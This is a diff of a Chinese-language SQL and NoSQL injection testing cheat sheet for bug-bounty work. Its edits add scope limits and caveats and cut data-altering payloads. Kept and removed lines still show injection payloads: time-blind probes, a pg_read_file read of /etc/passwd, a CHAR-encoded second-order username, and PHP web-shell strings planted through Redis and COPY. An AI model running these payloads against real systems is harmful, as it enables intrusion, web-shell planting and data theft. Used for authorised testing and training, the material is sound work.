@@ -2,11 +2,15 @@
 
 > 视角：黑盒，目标是从 0 到拿数据 / 拿权限
 
+## 静态示例的适用条件
+
+第 8 节的最小取证边界优先：后文的 dump、写 Shell、UDF、配置修改、凭证破解属于隔离实验的历史链条，不能在目标报告验证中直接执行。SQL 方言、列数、类型、驱动是否允许堆叠及权限必须匹配。Oracle FGETATTR/DBMS_PIPE.PACK_MESSAGE 是过程，不能按这些 SELECT 函数草图调用；RUNJAVA 也不是任意 Runtime 表达式执行器。PostgreSQL pg_sleep 返回 void，不能直接作为 AND 布尔值；SQLite readfile 是扩展函数而非通用内置文件读取，load_extension 不读取文件内容。MySQL current_user() 含 user@host，不能直接与 mysql.user.user 作等值匹配判断 FILE 权限。MySQL extractvalue/updatexml 等需核对版本，无法据旧 payload 推断当前功能。
+
 ## 1. 一句话说清
 
 SQLi = 把"数据"提升为"SQL 指令"。
-SRC 价值：能拖库或读 admin hash 的 SQLi → P1，DBA 权限或 RCE 升级 → P0。
-WooYun 27,732 案例中，**66% 在登录框、64% 在搜索、60% 在 POST 表单、26% 在 HTTP Header**。
+严重度依目标政策、认证条件及已证实影响评估；数据库权限或漏洞名称不自动决定 P0/P1。
+历史整理声称在 WooYun 27,732 案例中（未随附完整数据与统计脚本，不作为当前命中概率），**66% 在登录框、64% 在搜索、60% 在 POST 表单、26% 在 HTTP Header**。
 
 ---
 
@@ -339,9 +343,9 @@ SQLi
 | Header 注入 | 多 | `User-Agent: 1' AND ...` |
 
 通用指纹：
-- 错误信息含 `MySQL syntax error` / `near` / `unclosed quotation` / `ORA-00942` → 数据库类型确认
-- 同参数 `?id=1 AND sleep(5)` 5s 延时 + `?id=1 AND sleep(0)` 0s = 100% 时间盲
-- `?id=1` 与 `?id=2-1` 返回相同 = 数字型，可注入
+- 错误信息含 `MySQL syntax error` / `near` / `unclosed quotation` / `ORA-00942` → 数据库类型候选，需排除应用生成/代理改写的错误
+- 同参数 `?id=1 AND sleep(5)` 5s 延时 + `?id=1 AND sleep(0)` 0s = 时间盲候选；需重复真假控制、随机顺序和网络/缓存/应用延迟排除
+- `?id=1` 与 `?id=2-1` 返回相同不证明 SQL 计算或注入；应用可能忽略/转换参数或返回缓存
 
 ---
 
@@ -351,7 +355,7 @@ SQLi
 
 1. **基线**：`?id=1` 正常响应
 2. **注入证明**：报错 / 布尔差异 / 时间差（≥5s 稳定）
-3. **数据证据**：`version()`、`current_database()`、第一行 admin 用户名（脱敏）
+3. **数据证据**：`version()`、`current_database()`、事先批准的合成测试行标记
 4. **影响升级链**：能读 admin hash？能读其他库？能 outfile？
 
 ### 7.2 PoC 模板
@@ -417,13 +421,13 @@ SQLi → RCE (DBA)       = 9.8
 
 ## 8. 不要做的事
 
-- **禁**：用 sqlmap 全量 dump 表（即使能）。`--start 1 --stop 3` 拿 3 条样本足够。
+- **禁**：用 sqlmap 全量 dump 表（即使能）。即使 1–3 条真实用户记录也不是默认允许；使用批准的合成测试行或最小非敏感表达式。
 - **禁**：实际 outfile 写文件 / xp_cmdshell 执行命令。"证明能"即可。
 - **禁**：报告中粘贴他人完整 PII。脱敏到只剩前 2 + 后 2 字符。
 - **禁**：用读到的 admin hash 离线破解后实际登录目标后台。
 - **禁**：堆叠 DROP / DELETE / UPDATE 语句。仅 SELECT。
-- **限**：sqlmap 默认线程偏激进，`--threads=1 --delay=1`。
-- **报告中**：admin 密码 hash 写前 8 字符 + sha256 of full hash。
+- **限**：sqlmap 默认线程为 1；仍需目标认可的速率预算，`--threads=1 --delay=1`。
+- **报告中**：不收集或粘贴真实认证材料；使用合成测试标记。哈希再哈希不自动消除敏感性。
 
 ## H1 真实案例
 
@@ -935,7 +939,7 @@ _使用pg_read_file读取文件_
 **6. 6. 写入文件**  _[linux]_
 _使用COPY写入文件_
 ```
-' UNION SELECT 'test',COPY (SELECT '<?php system($_GET[c]);?>') TO '/var/www/html/shell.php'--
+-- COPY 是独立语句，不能放在 UNION SELECT 表达式位置；此片段无效，不作可运行 PoC。
 ```
 
 **WAF/EDR 绕过变体：**
@@ -1036,7 +1040,7 @@ _绕过登录认证_
 **3. 3. 逻辑运算注入**
 _使用$or逻辑运算_
 ```
-{"username": "admin", "password": {"$or": [{"password": "realpass"}, {"1": "1"}]}}
+{"username": "admin", "password": {"$ne": "synthetic-test"}}
 ```
 
 **4. 4. 正则注入**
@@ -1150,9 +1154,7 @@ _通过EVAL执行Lua脚本间接调用Redis命令，绕过对CONFIG/SET等直接
 ```
 redis-cli -h target.com
 > EVAL "redis.call('set','shell','<?php system(\$_GET[c]); ?>')" 0
-> EVAL "redis.call('config','set','dir','/var/www/html/')" 0
-> EVAL "redis.call('config','set','dbfilename','test.php')" 0
-> EVAL "redis.call('save')" 0
+# CONFIG/SAVE 是 noscript 命令，不能经 EVAL 这样调用；Lua 不绕过 ACL。
 ```
 
 ---
@@ -1392,7 +1394,7 @@ _在存储阶段使用注释截断(/**/)或CHAR()编码构造payload，WAF在输
 随后修改密码时SQL变为: UPDATE users SET password='new' WHERE username='admin'/*'
 
 注册用户名: CONCAT(CHAR(39),CHAR(32),CHAR(79),CHAR(82),CHAR(32),CHAR(39),CHAR(49),CHAR(39),CHAR(61),CHAR(39),CHAR(49))
-存储后二次使用时自动解码触发注入
+仅当应用后续不安全地把存储内容作为 SQL 表达式解析时才可能触发；参数绑定不会自动执行字符串。
 ```
 
 **2. Unicode标准化绕过**
@@ -1504,8 +1506,7 @@ _探测是否支持堆叠查询_
 **2. 2. MySQL堆叠查询**  _[linux]_
 _MySQL执行多语句_
 ```
-'; INSERT INTO users(username,password) VALUES('hacker','hacked');--
-'; UPDATE users SET password='hacked' WHERE username='admin';--
+-- INSERT/UPDATE 会改变账户数据，与只读验证边界冲突，不执行。
 '; SELECT SLEEP(5);--
 > ⚠️ 仅验证堆叠注入存在性，严禁 DROP/TRUNCATE/DELETE
 ```
@@ -1520,7 +1521,7 @@ _MSSQL执行命令_
 **4. 4. PostgreSQL堆叠查询**  _[linux]_
 _PostgreSQL读取文件_
 ```
-'; COPY users FROM '/etc/passwd';--
+-- COPY FROM 会写入表并可能失败，不是只读文件检查；删除此验证步骤。
 '; SELECT * FROM pg_read_file('/etc/passwd');--
 ```
 
